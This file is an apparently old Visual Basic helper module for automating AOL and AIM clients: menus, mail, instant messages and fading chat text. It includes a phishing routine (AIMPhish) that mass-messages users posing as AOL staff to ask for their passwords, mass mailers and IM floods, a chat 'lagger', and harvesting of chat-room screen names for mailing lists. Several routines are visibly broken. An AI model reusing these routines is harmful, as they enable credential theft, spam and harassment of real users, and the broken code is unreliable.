    Dim LookFor As Long, sMenu As Long, sCount As Long
    Dim LookSub As Long, sID As Long, sString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    aMenu& = GetMenu(AOL&)
    mCount& = GetMenuItemCount(aMenu&)
    For LookFor& = 0& To mCount& - 1
        sMenu& = GetSubMenu(aMenu&, LookFor&)
        sCount& = GetMenuItemCount(sMenu&)
        For LookSub& = 0 To sCount& - 1
            sID& = GetMenuItemID(sMenu&, LookSub&)
            sString$ = String$(100, " ")
            Call GetMenuString(sMenu&, sID&, sString$, 100&, 1&)
            If InStr(LCase(sString$), LCase(SearchString$)) Then
                Call SendMessageLong(AOL&, WM_COMMAND, sID&, 0&)
                Exit Sub
            End If
        Next LookSub&
    Next LookFor&
End Sub

Sub Ao3RunMenuByString(stringer As String)
Call Menubystring(Window(), stringer)
End Sub

Function Window()
AOL% = FindWindow("AOL Frame25", vbNullString)
Window = AOL%
End Function


Sub Ao3RunMenu(menu1 As Integer, menu2 As Integer)
Dim AOLWorks As Long
Static Working As Integer

AOLMenus% = GetMenu(FindWindow("AOL Frame25", vbNullString))
AOLSubMenu% = GetSubMenu(AOLMenus%, menu1)
AOLItemID = GetMenuItemID(AOLSubMenu%, menu2)
AOLWorks = CLng(0) * &H10000 Or Working
ClickAOLMenu = SendMessageByNum(FindWindow("AOL Frame25", vbNullString), 273, AOLItemID, 0&)

End Sub

Function RandomNumber(finished)
Randomize
RandomNumber = Int((Val(finished) * Rnd) + 1)
End Function

Sub SendMail(Recipiants, subject, message)

AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AoIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AoIcon% = GetWindow(AoIcon%, 2)

ClickIcon (AoIcon%)

Do: DoEvents
MDI% = FindChildByClass(AOL%, "MDIClient")
AOMail% = Findchildbytitle(MDI%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AoIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AoIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    AoIcon% = GetWindow(AoIcon%, 2)
Next GetIcon

ClickIcon (AoIcon%)

Do: DoEvents
AOError% = Findchildbytitle(MDI%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AoIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AoIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub

Sub Ao4Click(Button%)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub


Sub Click(Icon%)

SendMessage Icon%, WM_LBUTTONDOWN, 0, 0&

Pause 0.0000001

SendMessage Icon%, WM_LBUTTONUP, 0, 0&

End Sub

Sub ClickForward()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AoIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 8
AoIcon% = GetWindow(AoIcon%, 2)
NoFreeze% = DoEvents()
Next l
ClickIcon (AoIcon%)
End Sub

Sub ClickIcon(Icon%)
Clck% = SendMessage(Icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(Icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Sub ClickNext()
mailwin% = FindChildByClass(AOLMDI(), "AOL Child")
AoIcon% = FindChildByClass(mailwin%, "_AOL_Icon")
For l = 1 To 5
AoIcon% = GetWindow(AoIcon%, 2)
Next l
ClickIcon (AoIcon%)
End Sub


Function SNFromLastChatLine()
ChatText$ = LastChatLineWithSN
ChatTrim$ = Left$(ChatText$, 11)
For z = 1 To 11
    If Mid$(ChatTrim$, z, 1) = ":" Then
        SN = Left$(ChatTrim$, z - 1)
    End If
Next z
SNFromLastChatLine = SN
End Function

Function UserSN()
On Error Resume Next
AOL% = FindWindow("AOL Frame25", "America  Online")
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = Findchildbytitle(MDI%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
a% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
User = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = User
End Function

Sub Playwav(File)
'This will play a WAV file
SoundName$ = File
wFlags% = SND_ASYNC Or SND_NODEFAULT
X = sndPlaySound(SoundName$, wFlags%)
End Sub

Sub StopWaV()
'This will stop a WAV that is playing
Call Playwav(" ")
End Sub


Sub CooLWavyBlueBlack(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
     
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)

Next W
BoldSendChat (p$)
End Sub

Sub ListBox(itm As String, Lst As ListBox)
If Lst.ListCount = 0 Then
Lst.AddItem itm
Exit Sub
End If
Do Until xx = (Lst.ListCount)
Let diss_itm$ = Lst.List(xx)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let xx = xx + 1
Loop
If do_it = "NO" Then Exit Sub
Lst.AddItem itm
End Sub


Public Function Listsindex(oListBox As ListBox, sText As String) As Integer
Dim iIndex As Integer
With oListBox
 For iIndex = 0 To .ListCount - 1
   If .List(iIndex) = sText Then
    ListIndex = iIndex
    Exit Function
   End If
 Next iIndex
End With
ListIndex = -2
End Function


Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub

Sub strangeim(STUFF)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call AOL4_IM(STUFF, "<body bgcolor=#000000>")
Call AOL4_IM(STUFF, "<body bgcolor=#0000FF>")
Call AOL4_IM(STUFF, "<body bgcolor=#FF0000>")
Call AOL4_IM(STUFF, "<body bgcolor=#00FF00>")
Call AOL4_IM(STUFF, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub
Sub strangeimstop()
Do: DoEvents: Loop
End Sub
Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub

Sub TimeOut(duration)
starttime = Timer
Do While Timer - starttime < duration
DoEvents
Loop

End Sub

Sub XAOL4_LocateMember(name As String)
Call KeyWord("aol://3548:" + name)
End Sub

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<u>" & UnderLineChat & "</u>")
End Sub

Sub AOLIcon(Icon%)
Clck% = SendMessage(Icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(Icon%, WM_LBUTTONUP, 0, 0&)
End Sub

Function AOLIsOnline()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
welcome% = Findchildbytitle(MDI%, "Welcome, ")
If welcome% = 0 Then
AOLIsOnline = 0
Exit Function
End If
AOLIsOnline = 1
End Function

Function AddListToString(TheList As ListBox)
For DoList = 0 To TheList.ListCount - 1
AddListToString = AddListToString & TheList.List(DoList) & ", "
Next DoList
AddListToString = Mid(AddListToString, 1, Len(AddListToString) - 2)
End Function

Sub closewin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Function AddListToString2(TheList As ListBox)
For DoList = 0 To TheList.ListCount - 1
AddListToString2 = AddListToString2 & TheList.List(DoList) & "@aol.com, "
Next DoList
AddListToString2 = Mid(AddListToString2, 1, Len(AddListToString2) - 2)
End Function


Sub WaitForOk()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = Findchildbytitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub
Sub LaGGeR(TheText As String)
'Simple Lager Code
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    R$ = Mid$(G$, W, 1)
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "</html><html>" & R$ & "</html><html>" & u$ & "</html><html>" & S$ & "</html><html>" & T$
Next W
SendChat (p$)
End Sub



Public Sub Window_Close(win)
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub

Sub AddRoomToCombobox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListbox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub


Sub MassIM(List As ListBox, text As String)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call AOL4_IM(List.text, text)
TimeOut 1.5
Next MassIM1
List.Enabled = True
End Sub

Sub MassMailer(List As ListBox, subject, text As String)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call SendMail(List.text, subject, text + "<BR><BR>" + "               <a href=Http://www.macex.org><Font Color=#0008F8>.<Font Color=#000FF0>·<Font Color=#0016E8>¤<Font Color=#001EE1>[<Font Color=#0026DA>Z<Font Color=#002DD2>e<Font Color=#0034CA>r<Font Color=#003CC3>o<Font Color=#0044BC>X<Font Color=#004BB4> <Font Color=#0052AC>M<Font Color=#005AA5>a<Font Color=#00629E>s<Font Color=#006996>s<Font Color=#00708E>M<Font Color=#007887>a<Font Color=#008080>i<Font Color=#008778>l<Font Color=#008E70>e<Font Color=#009669>r<Font Color=#009E62> <Font Color=#00A55A>B<Font Color=#00AC52>y<Font Color=#00B44B> <Font Color=#00BC44>M<Font Color=#00C33C>a<Font Color=#00CA34>c<Font Color=#00D22D>e<Font Color=#00DA26>X<Font Color=#00E11E> <Font Color=#00E816>]<Font Color=#00F00F>¤<Font Color=#00F808>·<Font Color=#00FF00>.")
TimeOut 0.5
Next MassIM1
List.Enabled = True
End Sub





Sub AddRoomToListbox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
TheList.Clear

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
mmer.Label2.Caption = mmer.Label2.Caption + 1
ListBox.AddItem Person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub Anti45MinTimer()
'use this sub in a timer set at 100
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AoIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AoIcon%)
End Sub
Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AoIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AoIcon%)
End Sub
Sub AIMMassIM(List As ListBox, text As String)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call AimIM(List.text, text)
TimeOut 1.5
Next MassIM1
List.Enabled = True
End Sub

Sub AimIM(who As String, what As String)

Call OpenNewIM
SendIM1% = FindWindow("AIM_IMessage", vbNullString)
sendim2% = FindChildByClass(SendIM1%, "_Oscar_PersistantComb")
sendim3% = FindChildByClass(sendim2%, "Edit")
SendIM4% = SendMessageByString(sendim3%, WM_SETTEXT, 0, who$)
SendIM5% = FindChildByClass(SendIM1%, "Ate32class")
SendIM6% = GetWindow(SendIM5%, GW_HWNDNEXT)
SendIM7% = SendMessageByString(SendIM6%, WM_SETTEXT, 0, what$)
SendIM8% = FindChildByClass(SendIM1%, "_Oscar_IconBtn")
ClickIcon (SendIM8%)
End Sub

Sub OpenNewIM()

OpenNewIM1% = FindWindow("_Oscar_BuddyListWin", vbNullString)
OpenNewIM2% = FindChildByClass(OpenNewIM1%, "_Oscar_TabGroup")
OpenNewIM3% = FindChildByClass(OpenNewIM2%, "_Oscar_IconBtn")
ClickIcon (OpenNewIM3%)
End Sub

Sub AIMPhish(List As ListBox)

List.Enabled = False
List.ListIndex = 0
For MassIM1 = 0 To List.ListCount - 1
List.ListIndex = MassIM1
Call AimIM(List.text, "Hello, And welcome to America Online.  I am Brad Michaels from AOL System Integrity, and due to Billing Errors we have failed to recieve your account password.  To correct this situation please click on respond and enter your current account password.  Respond within 2 minutes to keep this connection active.   Thank you for your help and enjoy America Online!")
TimeOut 1.5
Next MassIM1
List.Enabled = True
End Sub


Sub AIMChatSend(text As String)

ChatSend1% = FindWindow("AIM_ChatWnd", vbNullString)
    
ChatSend2% = FindChildByClass(ChatSend1%, "_Oscar_Separator")
ChatSend3% = GetWindow(ChatSend2%, GW_HWNDNEXT)
ChatSend4% = GetWindow(ChatSend3%, GW_HWNDNEXT)
ChatSend5% = SendMessageByString(ChatSend3%, WM_SETTEXT, 0, text$)
ClickIcon (ChatSend4%)
End Sub


Function AIMHide()
'Hides the AIM window
Dim aim As Long, HideIt As Long
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
HideIt& = ShowWindow(aim&, SW_HIDE)
End Function


Function AIMShow()
'Shows the AIM window
aim& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Showit& = ShowWindow(aim&, SW_SHOW)
End Function






Sub AIMClearChat()
ClearChatText1% = FindWindow("AIM_ChatWnd", vbNullString)
ClearChatText2% = FindChildByClass(ClearChatText1%, "Ate32Class")
ClearChatText3% = SendMessageByString(ClearChatText2%, WM_SETTEXT, 0, "")
End Sub

Sub AIMFadeBlue(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & u$ & "<FONT COLOR=#00003F>" & S$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & l$ & "<FONT COLOR=#0000A5>" & F$ & "<FONT COLOR=#0000BE>" & B$ & "<FONT COLOR=#0000D7>" & c$ & "<FONT COLOR=#0000F1>" & D$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & j$ & "<FONT COLOR=#0000A5>" & K$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & Q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & z$
Next W
AIMChatSend (PC$)

End Sub
Sub AIMFadeBluGrn(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#0000FF>" & ab$ & "<FONT COLOR=#001199>" & u$ & "<FONT COLOR=#002288>" & S$ & "<FONT COLOR=#00003377>" & T$ & "<FONT COLOR=#004466>" & Y$ & "<FONT COLOR=#005555>" & l$ & "<FONT COLOR=#006644>" & F$ & "<FONT COLOR=#007733>" & B$ & "<FONT COLOR=#008822>" & c$ & "<FONT COLOR=#009911>" & D$ & "<FONT COLOR=#008822>" & H$ & "<FONT COLOR=#007733>" & j$ & "<FONT COLOR=#006644>" & K$ & "<FONT COLOR=#005555>" & M$ & "<FONT COLOR=#004466>" & n$ & "<FONT COLOR=#003377>" & Q$ & "<FONT COLOR=#002288>" & V$ & "<FONT COLOR=#001199>" & z$
Next W
AIMChatSend (PC$)
End Sub


Sub AIMFadeGreen(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & u$ & "<FONT COLOR=#003300>" & S$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & l$ & "<FONT COLOR=#007700>" & F$ & "<FONT COLOR=#008800>" & B$ & "<FONT COLOR=#009900>" & c$ & "<FONT COLOR=#00FF00>" & D$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & j$ & "<FONT COLOR=#007700>" & K$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & Q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & z$
Next W
AIMChatSend (PC$)
End Sub
Sub AIMFadeRed(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & u$ & "<FONT COLOR=#880000>" & S$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & l$ & "<FONT COLOR=#440000>" & F$ & "<FONT COLOR=#330000>" & B$ & "<FONT COLOR=#220000>" & c$ & "<FONT COLOR=#110000>" & D$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & j$ & "<FONT COLOR=#440000>" & K$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & Q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & z$
Next W
AIMChatSend (PC$)


End Sub

Sub AIMFadeYellow(TheText As String)
a = Len(TheText)
For W = 1 To a Step 18
    ab$ = Mid$(TheText, W, 1)
    u$ = Mid$(TheText, W + 1, 1)
    S$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    l$ = Mid$(TheText, W + 5, 1)
    F$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    c$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    j$ = Mid$(TheText, W + 11, 1)
    K$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    Q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & u$ & "<FONT COLOR=#888800>" & S$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & l$ & "<FONT COLOR=#444400>" & F$ & "<FONT COLOR=#333300>" & B$ & "<FONT COLOR=#222200>" & c$ & "<FONT COLOR=#111100>" & D$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & j$ & "<FONT COLOR=#444400>" & K$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & Q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & z$
Next W
AIMChatSend (PC$)

End Sub



Sub AntiPuntDis()
' this anti punt goes in a timer with an
' interval of about 50-100
' this will also distinguish whether the IM contains
' the h3 or the CTRL Backspace punt codes
'just type  Call AntiPuntDis in the timer code

AOL = FindWindow("AOL Frame25", "America  Online")
MDI = FindChildByClass(AOL, "MDIClient")
IMWin = Findchildbytitle(MDI, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = SNfromIM
X = GetText(rch2%)
If InStr(X, "    ") Then
Do
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
SendChat "" & nme & " Is trying to punt me"
End If

If InStr(X, "") Then
Do
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
Loop Until rch2% <> 1
SendChat "" & nme & " Is trying to punt me"
End If
End Sub

Function SNfromIM()

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient") '

IM% = Findchildbytitle(MDI%, ">Instant Message From:")
If IM% Then GoTo Greed
IM% = Findchildbytitle(MDI%, "  Instant Message From:")
If IM% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(IM%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = theSN$

End Function


Sub ShowAOL()
AOL% = FindWindow("AOL Frame25", vbNullString)
Call ShowWindow(AOL%, 5)
End Sub


Sub Aol30AddRoom(Lst As ListBox)


Dim Index As Long
Dim i As Integer
For Index = 0 To 25
namez$ = String$(256, " ")
ret = Ao3Getlist(Index, namez$)
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)))
ListBox namez$, Lst
Next Index
end_addr:
Lst.RemoveItem Lst.ListCount - 1
i = Listsindex(Lst, UserSN())
If i <> -2 Then Lst.RemoveItem i
End Sub



Public Function Ao3Getlist(Index, buffer As String)

'So you came here looking to edit it for ext.?
'Well go down to the line that says:
'Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
'The line should be near the end.
'Well hit enter and type in the following:
'Person$ = Person$ & "@AOL.COM"
'Listboxes.AddItem Person$
'Next Index
'That will add the @aol.com ext. to the list names.

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    
End Function
Function Ao3Gettext(child)
'this will get the text of the "child" window
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
getstring = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)

Ao3Gettext = TrimSpace$
End Function

Function AOL30Helloroom()


FindRoom
If FindRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

Room = FindRoom()
aolhandle = Childbyclass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Ao3Chatsend ("[–› faction ‹–] ‹› [–› " & Person$ & " ‹–]")
Pause (0.6)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function

Sub AOL30_IM(Person, message)

'Calls instant message window
'Use this format to call this sub:
'Call AOL30_IM "$im_off" , "-IMs Now Off!"
'That will turn off Instant Messages.

Call Menubystring(Window(), "Send an Instant Message")
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = Childbyclass(AOL%, "MDIClient")
IM% = Childbytitle(MDI%, "Send Instant Message")
aoledit% = Childbyclass(IM%, "_AOL_Edit")
aolrich% = Childbyclass(IM%, "RICHCNTL")
IMSend% = Childbyclass(IM%, "_AOL_Icon")
If aoledit% <> 0 And aolrich% <> 0 And IMSend% <> 0 Then Exit Do
Loop
Call Ao3Settext(aoledit%, Person)
Call Ao3Settext(aolrich%, message)
IMSend% = Childbyclass(IM%, "_AOL_Icon")
For sends = 1 To 9
IMSend% = GetWindow(IMSend%, GW_HWNDNEXT)
Next sends
Icon (IMSend%)
Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = Childbyclass(AOL%, "MDIClient")
IM% = Childbytitle(MDI%, "Send Instant Message")
aolcl% = FindWindow("#32770", "America Online")
If aolcl% <> 0 Then closer = SendMessage(aolcl%, WM_CLOSE, 0, 0): closer2 = SendMessage(IM%, WM_CLOSE, 0, 0): Exit Do
If IM% = 0 Then Exit Do
Loop
End Sub

Sub AOL30_Keyword(text)
Call Menubystring(Window(), "Keyword...")

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = Childbyclass(AOL%, "MDIClient")
keyw% = Childbytitle(MDI%, "Keyword")
kedit% = Childbyclass(keyw%, "_AOL_Edit")
If kedit% Then Exit Do
Loop

editsend% = SendMessageByString(kedit%, WM_SETTEXT, 0, text)
pausing = DoEvents()
Sending% = SendMessage(kedit%, WM_CHAR, 13, 0)
pausing = DoEvents()
End Sub

Sub AOL30Killwait()
Call Menubystring(Window(), "&About America Online")
Do: DoEvents
